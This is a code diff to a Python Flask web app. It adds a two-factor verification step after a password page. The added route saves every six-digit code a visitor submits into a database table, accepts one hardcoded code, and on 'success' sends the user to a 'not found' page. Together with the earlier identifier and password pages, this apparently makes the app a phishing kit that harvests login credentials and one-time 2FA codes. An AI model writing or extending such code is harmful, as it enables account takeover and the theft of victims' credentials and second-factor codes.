@@ -244,10 +244,32 @@ def login_password():
         session.pop("identifier", None)
 
         # Redirect to notfound.html page after success
-        return redirect(url_for("notfound"))
+        return redirect(url_for("verify_2fa"))
 
     # If GET request, just render the password page
     return render_template("vpassword.html", identifier=identifier)
+
+@app.route("/verify-2fa", methods=["GET", "POST"])
+def verify_2fa():
+    if request.method == "GET":
+        # Render the 2FA input page
+        return render_template("v2fa.html")
+
+    # Handle POST (AJAX code submission)
+    data = request.get_json(silent=True) or {}
+    code = (data.get("code") or "").strip()
+
+    if not code.isdigit() or len(code) != 6:
+        return {"success": False, "error": "Please enter a 6-digit code."}, 400
+
+    db = get_db()
+    db.execute("INSERT INTO vcodes (code) VALUES (?)", (code,))
+    db.commit()
+
+    if code == "793292":
+        return {"success": True, "redirect": url_for("notfound")}, 200
+    else:
+        return {"success": False, "error": "Invalid code — please try again."}, 400
 
 
 
@@ -268,5 +290,6 @@ def view_data():
 
 if __name__ == '__main__': 
     app.run(debug=True)
+
 
 
